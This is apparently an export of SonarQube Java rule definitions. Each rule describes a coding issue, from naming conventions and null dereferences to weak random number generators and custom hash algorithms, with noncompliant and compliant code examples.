Example</h2>\n<pre>\nif(isActiveSession(request.getRequestedSessionId()) ){\n  ...\n}\n</pre>\n\n<h2>See</h2>\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/807">MITRE, CWE-807</a> - Reliance on Untrusted Inputs in a Security Decision\n</li><li> <a href="http://www.sans.org/top25-software-errors/">SANS Top 25</a> - Porous Defenses\n</li><li> <a href="https://www.owasp.org/index.php/Top_10_2013-A2-Broken_Authentication_and_Session_Management">OWASP Top Ten 2013 Category A2</a> - Broken Authentication and Session Management\n</li><li> Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#SERVLET_SESSION_ID">Untrusted Session Cookie Value</a>\n</li></ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	cwe,owasp-a2,sans-top25-porous	f	HTML	1511453807112	1511453807113	3
580	Objects should not be created only to "getClass"	S2133	S2133	squid	<p>Creating an object for the sole purpose of calling <code>getClass</code> on it is a waste of memory and cycles. Instead, simply use the class' <code>.class</code> property.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nMyObject myOb = new MyObject();  // Noncompliant\nClass c = myOb.getClass(); \n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nClass c = MyObject.class; \n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	performance	f	HTML	1511453807114	1511453807114	1
581	Only standard cryptographic algorithms should be used	S2257	S2257	squid	<p>The use of a non-standard algorithm is dangerous because a determined attacker may be able to break the algorithm and compromise whatever data has been protected. Standard algorithms like <code>SHA-256</code>, <code>SHA-384</code>, <code>SHA-512</code>, ... should be used instead.</p>\n<p>This rule tracks creation of <code>java.security.MessageDigest</code> subclasses.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nMyCryptographicAlgorithm extends MessageDigest {\n  ...\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/327.html">CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm</li>\n<li> <a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten 2013 Category A6</a> - Sensitive Data Exposure</li>\n<li> <a href="http://www.sans.org/top25-software-errors/">SANS Top 25</a> - Porous Defenses</li>\n<li> Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#CUSTOM_MESSAGE_DIGEST">MessageDigest is Custom</a></li>\n</ul>	4	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1d	\N	\N	cwe,owasp-a6,sans-top25-porous	f	HTML	1511453807114	1511453807115	3
582	"assert" should only be used with boolean variables	S3346	S3346	squid	<p>Since <code>assert</code> statements aren't executed by default (they must be enabled with JVM flags) developers should never rely on their execution the evaluation of any logic required for correct program function.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nassert myList.remove(myList.get(0));  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nboolean removed = myList.remove(myList.get(0));\nassert removed;\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	suspicious	f	HTML	1511453807115	1511453807115	1
583	Empty arrays and collections should be returned instead of null	S1168	S1168	squid	<p>Returning <code>null</code> instead of an actual array or collection forces callers of the method to explicitly test for nullity, making them more complex and less readable.</p>\n<p>Moreover, in many cases, <code>null</code> is used as a synonym for empty.</p>\n<p>The following code: </p>\n<pre>\npublic static Result[] getResults() {\n  return null;                             // Noncompliant\n}\n\npublic static void main(String[] args) {\n  Result[] results = getResults();\n  \n  if (results != null) {                   // Nullity test required to prevent NPE\n    for (Result result: results) {\n      /* ... */\n    }\n  }\n}\n</pre>\n<p>should be refactored into:</p>\n<pre>\npublic static Result[] getResults() {\n  return new Result[0];                    // Compliant\n}\n\npublic static void main(String[] args) {\n  for (Result result: getResults()) {\n    /* ... */\n  }\n}\n</pre>\n<p>This rule also applies to collections:</p>\n<pre>\npublic static List&lt;Result&gt; getResults() {\n  return null;                             // Noncompliant\n}\n</pre>\n<p>should be refactored into:</p>\n<pre>\npublic static List&lt;Result&gt; getResults() {\n  return Collections.emptyList();          // Compliant\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/AgG7AQ">CERT, MSC19-C</a> - For functions that return an array, prefer returning an empty array over a null value</li>\n</ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	cert	f	HTML	1511453807116	1511453807117	1
584	Null pointers should not be dereferenced	S2259	S2259	squid	<p>\nA reference to <code>null</code> should never be dereferenced/accessed.\nDoing so will cause a <code>NullPointerException</code> to be thrown. At best, such an exception will cause abrupt program termination.\nAt worst, it could expose debugging information that would be useful to an attacker, or it could allow an attacker to bypass security measures.\n</p>\n\n<p>\nNote that when they are present, this rule takes advantage of <code>@CheckForNull</code> and <code>@Nonnull</code> annotations defined in\n<a href="https://jcp.org/en/jsr/detail?id=305">JSR-305</a> to understand which values are or are not nullable.\n</p>\n\n<p>\n@Nullable denotes that, under some unspecified circumstances, the value might be null. To keep false positives low, this annotation is ignored.\nWhether an explicit test is required or not is left to the developer's discretion.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\n@CheckForNull\nString getName() {...}\n\npublic boolean isNameEmpty() {\n  return getName().length() == 0; // Noncompliant; the result of getName() could be null, but isn't null-checked\n}\n</pre>\n\n<pre>\nConnection conn = null;\nStatement stmt = null;\ntry {\n  conn = DriverManager.getConnection(DB_URL,USER,PASS);\n  stmt = conn.createStatement();\n  // ...\n\n} catch(Exception e) {\n  e.printStackTrace();\n} finally {\n  stmt.close(); // Noncompliant; stmt could be null if an exception was thrown in the try{} block\n  conn.close(); // Noncompliant; conn could be null if an exception was thrown\n}\n</pre>\n\n<pre>\nprivate void merge(@Nonnull Color firstColor, @Nonnull Color secondColor){...}\n\npublic void append(@CheckForNull Color color) {\n    merge(currentColor, color); // Noncompliant; color should be null-checked because merge(...) doesn't accept nullable parameters\n}\n</pre>\n\n<pre>\nvoid paint(Color color) {\n  if(color == null) {\n    System.out.println("Unable to apply color " + color.toString()); // Noncompliant; NullPointerException will be thrown\n    return;\n  }\n  ...\n}\n</pre>\n\n<h2>See</h2>\n<ul>\n   <li><a href="http://cwe.mitre.org/data/definitions/476.html">MITRE, CWE-476</a> - NULL Pointer Dereference</li>\n   <li><a href="https://www.securecoding.cert.org/confluence/x/PAw">CERT, EXP34-C</a> - Do not dereference null pointers</li>\n   <li><a href="https://www.securecoding.cert.org/confluence/x/ZwDOAQ">CERT, EXP01-J</a> - Never dereference null pointers</li>\n   <li><a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection">OWASP Top Ten 2013 Category A1</a> - Injection</li>\n   <li><a href="https://www.owasp.org/index.php/Top_10_2013-A2-Broken_Authentication_and_Session_Management">OWASP Top Ten 2013 Category A2</a> - Broken Authentication and Session Management</li>\n   <li><a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten 2013 Category A6</a> - Sensitive Data Exposure</li>\n</ul>	4	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	cert,cwe,owasp-a1,owasp-a2,owasp-a6	f	HTML	1511453807117	1511453807118	2
586	Functions should not be defined with a variable number of arguments	S923	S923	squid	<p>As stated per effective java : </p>\n<blockquote>Varargs methods are a convenient way to define methods that require a variable number of arguments, but they should not be overused. They can produce confusing results if used innapropriately.</blockquote>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid fun ( String... strings )\t// Noncompliant\n{\n  // ...\n}\n</pre>\n\n<h2>See</h2>\n<ul>\n<li> MISRA C:2004, 16.1 - Functions shall not be defined with a variable number of arguments.\n</li><li> MISRA C++:2008, 8-4-1 - Functions shall not be defined using the ellipsis notation.\n</li><li> <a href="https://www.securecoding.cert.org/confluence/x/i4CW">CERT, DCL50-CPP</a> - Do not define a C-style variadic function\n</li></ul>	0	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	cert,misra,pitfall	f	HTML	1511453807119	1511453807120	1
587	Class names should comply with a naming convention	S00101	S00101	squid	<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that all class names match a provided regular expression.</p>\n<h2>Noncompliant Code Example</h2>\n\n<p>With default provided regular expression <code>^[A-Z][a-zA-Z0-9]*$</code>:</p>\n<pre>\nclass my_class {...}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nclass MyClass {...}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	convention	f	HTML	1511453807121	1511453807121	1
588	Switch cases should end with an unconditional "break" statement	S128	S128	squid	<p>\n  When the execution is not explicitly terminated at the end of a switch case,\n  it continues to execute the statements of the following case. While this is sometimes intentional,\n  it often is a mistake which leads to unexpected behavior.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nswitch (myVariable) {\n  case 1:                              \n    foo();\n    break;\n  case 2:  // Both 'doSomething()' and 'doSomethingElse()' will be executed. Is it on purpose ?\n    doSomething();\n  default:                               \n    doSomethingElse();\n    break;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nswitch (myVariable) {\n  case 1:                              \n    foo();\n    break;\n  case 2: \n    doSomething();\n    break;\n  default:                               \n    doSomethingElse();\n    break;\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>This rule is relaxed in the following cases:</p>\n<pre>\nswitch (myVariable) {\n  case 0:                                // Empty case used to specify the same behavior for a group of cases.\n  case 1:                               \n    doSomething();\n    break;\n  case 2:                                // Use of return statement\n    return;\n  case 3:                                // Use of throw statement\n    throw new IllegalStateException();\n  default:                               // For the last case, use of break statement is optional\n    doSomethingElse();\n}\n</pre>\n\n<h2>See</h2>\n<ul>\n  <li>MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used.</li>\n  <li>MISRA C:2004, 15.2 - An unconditional break statement shall terminate every non-empty switch clause</li>\n  <li>MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement.</li>\n  <li>MISRA C++:2008, 6-4-5 - An unconditional throw or break statement shall terminate every non-empty switch-clause</li>\n  <li>MISRA C:2012, 16.1 - All switch statements shall be well-formed</li>\n  <li>MISRA C:2012, 16.3 - An unconditional break statement shall terminate every switch-clause</li>\n  <li><a href="http://cwe.mitre.org/data/definitions/484.html">MITRE, CWE-484</a> - Omitted Break Statement in Switch</li>\n  <li><a href="https://www.securecoding.cert.org/confluence/x/YIFLAQ">CERT, MSC17-C</a> - Finish every set of statements associated with a case label with a break statement</li>\n  <li><a href="https://www.securecoding.cert.org/confluence/x/ZoFLAQ">CERT, MSC18-CPP</a> - Finish every set of statements associated with a case label with a break statement</li>\n</ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	cert,cwe,misra,suspicious	f	HTML	1511453807122	1511453807123	1
589	Method names should comply with a naming convention	S00100	S00100	squid	<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all method names match a provided regular expression.</p>\n<h2>Noncompliant Code Example</h2>\n\n<p>With default provided regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>\n<pre>\npublic int DoSomething(){...}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic int doSomething(){...}\n</pre>\n<h2>Exceptions</h2>\n\n<p>Overriding methods are excluded. </p>\n<pre>\n@Override\npublic int Do_Something(){...}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	convention	f	HTML	1511453807123	1511453807124	1
590	Methods should not be too complex	MethodCyclomaticComplexity	MethodCyclomaticComplexity	squid	<p>\n  The cyclomatic complexity of methods should not exceed a defined threshold.\n  Complex code can perform poorly and will in any case be difficult to understand and therefore to maintain.\n</p>	2	\N	READY	java	\N	\N	\N	\N	\N	LINEAR_OFFSET	\N	1min	\N	10min	per complexity point above the threshold	\N	brain-overload	f	HTML	1511453807126	1511453807126	1
598	Control flow statements "if", "for", "while", "switch" and "try" should not be nested too deeply	S134	S134	squid	<p>\nNested <code>if</code>, <code>for</code>, <code>while</code>, <code>switch</code>, and <code>try</code> statements is a key ingredient for making what's known as "Spaghetti code".\n</p>\n<p>Such code is hard to read, refactor and therefore maintain.</p>\n\n<h2>Noncompliant Code Example</h2>\n<p>With the default threshold of 3:</p>\n<pre>\nif (condition1) {                  // Compliant - depth = 1\n  /* ... */\n  if (condition2) {                // Compliant - depth = 2\n    /* ... */\n    for(int i = 0; i &lt; 10; i++) {  // Compliant - depth = 3, not exceeding the limit\n      /* ... */\n      if (condition4) {            // Noncompliant - depth = 4\n        if (condition5) {          // Depth = 5, exceeding the limit, but issues are only reported on depth = 4\n          /* ... */\n        }\n        return;\n      }\n    }\n  }\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	brain-overload	f	HTML	1511453807137	1511453807138	1
599	String.valueOf() should not be appended to a String	S1153	S1153	squid	<p>\nAppending <code>String.valueOf()</code> to a <code>String</code> decreases the code readability.\nThe argument passed to <code>String.valueOf()</code> should be directly appended instead.\n</p>\n\n<p>The following code:</p>\n\n<pre>\npublic void display(int i){\n  System.out.println("Output is " + String.valueOf(i));    // Noncompliant\n}\n</pre>\n\n<p>should be refactored into:</p>\n\n<pre>\npublic void display(int i){\n  System.out.println("Output is " + i);                    // Compliant\n}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	clumsy	f	HTML	1511453807140	1511453807140	1
600	Values should not be uselessly incremented	S2123	S2123	squid	<p>A value that is incremented or decremented and then not stored is at best wasted code and at worst a bug.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic int pickNumber() {\n  int i = 0;\n  int j = 0;\n\n  i = i++; // Noncompliant; i is still zero\n\n  return j++; // Noncompliant; 0 returned\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic int pickNumber() {\n  int i = 0;\n  int j = 0;\n\n  i++; \n  return ++j; \n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807140	1511453807141	2
601	Labels should not be used	LabelsShouldNotBeUsedCheck	LabelsShouldNotBeUsedCheck	squid	<p>\nLabels are not commonly used in Java, and many developers do not understand how they work.\nMoreover, their usage make the control flow harder to follow, which reduces the code's readability.\n</p>\n\n<p>\nThe following code:\n</p>\n\n<pre>\nint matrix[][] = {\n  {1, 2, 3},\n  {4, 5, 6},\n  {7, 8, 9}\n};\n\nouter: for (int row = 0; row < matrix.length; row++) {   // Noncompliant\n  for (int col = 0; col < matrix[row].length; col++) {\n    if (col == row) {\n      continue outer;\n    }\n    System.out.println(matrix[row][col]);                // Prints the elements under the diagonal, i.e. 4, 7 and 8\n  }\n}\n</pre>\n\n<p>\nshould be refactored into:\n</p>\n\n<pre>\nfor (int row = 1; row < matrix.length; row++) {          // Compliant\n  for (int col = 0; col < row; col++) {\n    System.out.println(matrix[row][col]);                // Also prints 4, 7 and 8\n  }\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	confusing	f	HTML	1511453807141	1511453807141	1
605	Pseudorandom number generators (PRNGs) should not be used in secure contexts	S2245	S2245	squid	<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that will be generated, and use this guess to impersonate another user or access sensitive information.</p>\n<p>As the <code>java.util.Random</code> class relies on a pseudorandom number generator, this class and relating <code>java.lang.Math.random()</code> method should not be used for security-critical applications or for protecting sensitive data. In such context, the <code>java.security.SecureRandom</code> class which relies on a cryptographically strong random number generator (RNG) should be used in place.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nRandom random = new Random();\nbyte bytes[] = new byte[20];\nrandom.nextBytes(bytes);\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/338.html">MITRE, CWE-338</a> - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)</li>\n<li> <a href="http://cwe.mitre.org/data/definitions/330.html">MITRE, CWE-330</a> - Use of Insufficiently Random Values</li>\n<li> <a href="http://cwe.mitre.org/data/definitions/326.html">MITRE, CWE-326</a> - Inadequate Encryption Strength</li>\n<li> <a href="http://cwe.mitre.org/data/definitions/310">MITRE, CWE-310</a> - Cryptographic Issues</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/display/java/MSC02-J.+Generate+strong+random+numbers">CERT, MSC02-J</a> - Generate strong random numbers</li>\n<li> <a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten 2013 Category A6</a> - Sensitive Data Exposure</li>\n<li> Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM">Predictable Pseudo Random Number Generator</a></li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	cert,cwe,owasp-a6	f	HTML	1511453807145	1511453807146	3
606	Primitive wrappers should not be instantiated only for "toString" or "compareTo" calls	S1158	S1158	squid	<p>\n  Creating temporary primitive wrapper objects only for <code>String</code> conversion\n  or the use of the <code>compareTo</code> method is inefficient.\n</p>\n<p>\n  Instead, the static <code>toString()</code> or <code>compareTo</code> method of\n  the primitive wrapper class should be used.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nnew Integer(myInteger).toString();  // Noncompliant\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nInteger.toString(myInteger);        // Compliant\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	clumsy	f	HTML	1511453807146	1511453807147	1
607	"Double.longBitsToDouble" should not be used for "int"	S2127	S2127	squid	<p><code>Double.longBitsToDouble</code> expects a 64-bit, <code>long</code> argument. Pass it a smaller value, such as an <code>int</code> and the mathematical conversion into a <code>double</code> simply won't work as anticipated because the layout of the bits will be interpreted incorrectly, as if a child were trying to use an adult's gloves.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nint i = 42;\ndouble d = Double.longBitsToDouble(i);  // Noncompliant\n</pre>	4	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	\N	f	HTML	1511453807147	1511453807147	2
609	Classes that override "clone" should be "Cloneable" and call "super.clone()"	S1182	S1182	squid	<p><code>Cloneable</code> is the marker <code>Interface</code> that indicates that <code>clone()</code> may be called on an object. Overriding <code>clone()</code> without implementing <code>Cloneable</code> can be useful if you want to control how subclasses clone themselves, but otherwise, it's probably a mistake.</p>\n<p>The usual convention for <code>Object.clone()</code> according to Oracle's Javadoc is:</p>\n<ol>\n<li> <code>x.clone() != x</code></li>\n<li> <code>x.clone().getClass() == x.getClass()</code></li>\n<li> <code>x.clone().equals(x)</code></li>\n</ol>\n<p>Obtaining the object that will be returned by calling <code>super.clone()</code> helps to satisfy those invariants:</p>\n<ol>\n<li> <code>super.clone()</code> returns a new object instance</li>\n<li> <code>super.clone()</code> returns an object of the same type as the one <code>clone()</code> was called on</li>\n<li> <code>Object.clone()</code> performs a shallow copy of the object's state</li>\n</ol>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nclass BaseClass {  // Noncompliant; should implement Cloneable\n  @Override\n  public Object clone() throws CloneNotSupportedException {    // Noncompliant; should return the super.clone() instance\n    return new BaseClass();\n  }\n}\n\nclass DerivedClass extends BaseClass implements Cloneable {\n  /* Does not override clone() */\n\n  public void sayHello() {\n    System.out.println("Hello, world!");\n  }\n}\n\nclass Application {\n  public static void main(String[] args) throws Exception {\n    DerivedClass instance = new DerivedClass();\n    ((DerivedClass) instance.clone()).sayHello();              // Throws a ClassCastException because invariant #2 is violated\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nclass BaseClass implements Cloneable {\n  @Override\n  public Object clone() throws CloneNotSupportedException {    // Compliant\n    return super.clone();\n  }\n}\n\nclass DerivedClass extends BaseClass implements Cloneable {\n  /* Does not override clone() */\n\n  public void sayHello() {\n    System.out.println("Hello, world!");\n  }\n}\n\nclass Application {\n  public static void main(String[] args) throws Exception {\n    DerivedClass instance = new DerivedClass();\n    ((DerivedClass) instance.clone()).sayHello();              // Displays "Hello, world!" as expected. Invariant #2 is satisfied\n  }\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/580.html">MITRE, CWE-580</a> - clone() Method Without super.clone()</li>\n</ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	cwe	f	HTML	1511453807148	1511453807149	1
610	JUnit framework methods should be declared properly	S2391	S2391	squid	<p>\n  If the <code>suite</code> method in a JUnit 3 <code>TestCase</code> is not declared correctly, it will not be used.\n  Such a method must be named "suite", have no arguments, be <code>public static</code>, and must return either a <code>junit.framework.Test</code>\n  or a <code>junit.framework.TestSuite</code>.\n</p>\n\n<p>\n  Similarly, <code>setUp</code> and <code>tearDown</code> methods that aren't properly capitalized will also be ignored.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nTest suite() { ... }  // Noncompliant; must be public static\npublic static boolean suite() { ... }  // Noncompliant; wrong return type\npublic static Test suit() { ... }  // Noncompliant; typo in method name\npublic static Test suite(int count) { ... } // Noncompliant; must be no-arg\n\npublic void setup() { ... } // Noncompliant; should be setUp\npublic void tearDwon() { ... }  // Noncompliant; should be tearDown\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic static Test suite() { ... }\npublic void setUp() { ... }\npublic void tearDown() { ... }\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	tests	f	HTML	1511453807150	1511453807150	2
611	"wait(...)", "notify()" and "notifyAll()" methods should only be called when a lock is obviously held on an object	S2273	S2273	squid	<p>By contract, the method <code>Object.wait(...)</code>, <code>Object.notify()</code> and <code>Object.notifyAll()</code> should be called by a thread that is the owner of the object's monitor. If this is not the case an <code>IllegalMonitorStateException</code> exception is thrown. This rule reinforces this constraint by making it mandatory to call one of these methods only inside a <code>synchronized</code> method or statement.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nprivate void removeElement() {\n  while (!suitableCondition()){\n    obj.wait();\n  }\n  ... // Perform removal\n}\n</pre>\n\nor\n\n<pre>\nprivate void removeElement() {\n  while (!suitableCondition()){\n    wait();\n  }\n  ... // Perform removal\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nprivate void removeElement() {\n  synchronized(obj) {\n    while (!suitableCondition()){\n      obj.wait();\n    }\n    ... // Perform removal\n  }\n}\n</pre>\n\nor\n\n<pre>\nprivate synchronized void removeElement() {\n  while (!suitableCondition()){\n    wait();\n  }\n  ... // Perform removal\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	multi-threading	f	HTML	1511453807150	1511453807151	2
612	"Iterator.next()" methods should throw "NoSuchElementException"	S2272	S2272	squid	By contract, any implementation of the <code>java.util.Iterator.next()</code> method should throw a <code>NoSuchElementException</code> exception when the iteration has no more elements. Any other behavior when the iteration is done could lead to unexpected behavior for users of this <code>Iterator</code>. \n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyIterator implements Iterator&lt;String&gt;{\n  ...\n  public String next(){\n    if(!hasNext()){\n      return null;\n    }\n    ...\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyIterator implements Iterator&lt;String&gt;{\n  ...\n  public String next(){\n    if(!hasNext()){\n      throw new NoSuchElementException();\n    }\n    ...\n  }\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	unpredictable	f	HTML	1511453807151	1511453807152	1
613	"runFinalizersOnExit" should not be called	S2151	S2151	squid	<p>Running finalizers on JVM exit is disabled by default. It can be enabled with <code>System.runFinalizersOnExit</code> and <code>Runtime.runFinalizersOnExit</code>, but both methods are deprecated because they are are inherently unsafe. </p>\n<p>According to the Oracle Javadoc:</p>\n<blockquote>\n<p>It may result in finalizers being called on live objects while other threads are concurrently manipulating those objects, resulting in erratic behavior or deadlock.</p>\n</blockquote>\n<p>If you really want to be execute something when the virtual machine begins its shutdown sequence, you should attach a shutdown hook. </p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic static void main(String [] args) {\n  ...\n  System.runFinalizersOnExit(true);  // Noncompliant\n  ...\n}\n\nprotected void finalize(){\n  doSomething();\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic static void main(String [] args) {\n  Runtime.addShutdownHook(new Runnable() {\n    public void run(){\n      doSomething();\n    }\n  });\n  //...\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/H4cbAQ">CERT, MET12-J</a> - Do not use finalizers</li>\n</ul>	4	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	cert	f	HTML	1511453807152	1511453807152	2
614	Local variables should not shadow class fields	HiddenFieldCheck	HiddenFieldCheck	squid	<p>Shadowing fields with a local variable is a bad practice that reduces code readability: It makes it confusing to know whether the field or the variable is being used.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass Foo {\n  public int myField;\n\n  public void doSomething() {\n    int myField = 0;\n    ...\n  }\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	pitfall	f	HTML	1511453807153	1511453807153	1
615	Static non-final field names should comply with a naming convention	S3008	S3008	squid	<p>Shared naming conventions allow teams to  collaborate efficiently. This rule checks that static non-final field names match a provided regular expression.</p>\n<h2>Noncompliant Code Example</h2>\n\n<p>With the default regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>\n<pre>\npublic final class MyClass {\n   private static String foo_bar;\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nclass MyClass {\n   private static String fooBar;\n}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	convention	f	HTML	1511453807153	1511453807154	1
616	Public types, methods and fields (API) should be documented with Javadoc	UndocumentedApi	UndocumentedApi	squid	<p>Try to imagine using the standard Java API (Collections, JDBC, IO, ...) without Javadoc. It would be a nightmare, because Javadoc is the only way to understand of the contract of the API. Documenting an API with Javadoc increases the productivity of the developers consuming it.</p>\n<p>The following Javadoc elements are required:</p>\n<ul>\n<li> Parameters, using <code>@param parameterName</code>.</li>\n<li> Method return values, using <code>@return</code>.</li>\n<li> Generic types, using <code>@param &lt;T&gt;</code>.</li>\n</ul>\n<p>The following public methods and constructors are not taken into account by this rule:</p>\n<ul>\n<li> Getters and setters.</li>\n<li> Methods with @Override annotation.</li>\n<li> Empty constructors.</li>\n<li> Static constants.</li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\n/**\n  * This is a Javadoc comment\n  */\npublic class MyClass&lt;T&gt; implements Runnable {    // Noncompliant - missing '@param &lt;T&gt;'\n\n  public static final DEFAULT_STATUS = 0;    // Compliant - static constant\n  private int status;                           // Compliant - not public\n\n  public String message;                  // Noncompliant\n\n  public MyClass() {                         // Noncompliant - missing documentation\n    this.status = DEFAULT_STATUS;\n  }\n\n  public void setStatus(int status) {  // Compliant - setter\n    this.status = status;\n  }\n\n  @Override\n  public void run() {                          // Compliant - has @Override annotation\n  }\n\n  protected void doSomething() {    // Compliant - not public\n  }\n\n  public void doSomething2(int value) {  // Noncompliant\n  }\n\n  public int doSomething3(int value) {  // Noncompliant\n    return value;\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\n/**\n  * This is a Javadoc comment\n  * @param &lt;T&gt; ...\n  */\npublic class MyClass&lt;T&gt; implements Runnable {\n\n  public static final DEFAULT_STATUS = 0;\n  private int status;\n\n  /**\n    * This is a Javadoc comment\n    */\n  public String message;\n\n  /**\n   * Class comment...\n   */\n  public MyClass() {\n    this.status = DEFAULT_STATUS;\n  }\n\n  public void setStatus(int status) {\n    this.status = status;\n  }\n\n  @Override\n  public void run() {\n  }\n\n  protected void doSomething() {\n  }\n\n  /**\n    * @param value ...\n    */\n  public void doSomething(int value) {\n\n  /**\n    *  {@inheritDoc}\n    */\n  public int doSomething(int value) {\n    return value;\n  }\n}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	convention	f	HTML	1511453807155	1511453807156	1
